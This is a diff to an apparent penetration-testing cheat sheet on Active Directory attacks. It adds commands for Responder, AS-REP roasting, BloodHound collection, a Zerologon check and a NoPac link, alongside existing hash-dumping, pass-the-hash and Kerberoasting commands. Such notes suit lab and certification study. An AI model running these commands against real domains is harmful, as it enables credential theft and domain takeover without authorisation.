@@ -65,10 +65,9 @@ Dumping hashes from attack machine:
 impacket-secretsdump domain.local/username@10.10.10.10 -just-dc
 ```
 
-
 ###### Responder
 ```
-
+> responder -I eth0 -rdw
 ```
 
 ###### PowerView
@@ -77,7 +76,6 @@ impacket-secretsdump domain.local/username@10.10.10.10 -just-dc
 > Get-NetLoggedon -ComputerName computer1
 > Get-NetSession -ComputerName dc01
 ```
-
 
 ###### Pass The Hash with CrackMapExec
 ```
@@ -101,17 +99,39 @@ impacket-secretsdump domain.local/username@10.10.10.10 -just-dc
 > klist
 
 > python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt ticketname
+
+
+AS-REP roasting
+> impacket-GetNPUsers -format john -dc-ip 10.10.10.10 domain.local/username
+
 ```
+
 
 ###### Bloodhound
 ```
+Bloodhound documentation:
+https://bloodhound.readthedocs.io/en/latest/
 
+Installation:
+> sudo apt install bloodhound
+> sudo pip3 install bloodhound
+
+First, gather the data with an ingestor, either the bloodhound-python script from fox-it or SharpHound.Then import the json files in the neo4j database.
+> (sudo) neo4j console
+starts on localhost:7687
+
+Example bloodhound-python:
+> bloodhound-python -c All -u 'username' -p 'password' -gc "MACHINE.domain.local" -dc "MACHINE.domain.local" -d "domain.local" -ns 10.10.10.10
+
+Example sharphound
+https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
+> import-module .\SharpHound.ps1                                                       PS > Invoke-Bloodhound -c All [-d domain.local]
 ```
 
 
-###### Zerologon
+###### Zerologon (probably going to break the domain...)
 ```
-
+> python3 49871.py -do check -target NETBIOSNAME -ip 10.10.10.10
 ```
 
 ###### PrintNightmare
@@ -125,5 +145,5 @@ Run with (in powershell):
 
 ###### NoPac
 ```
-
+https://github.com/cube0x0/noPac
 ```
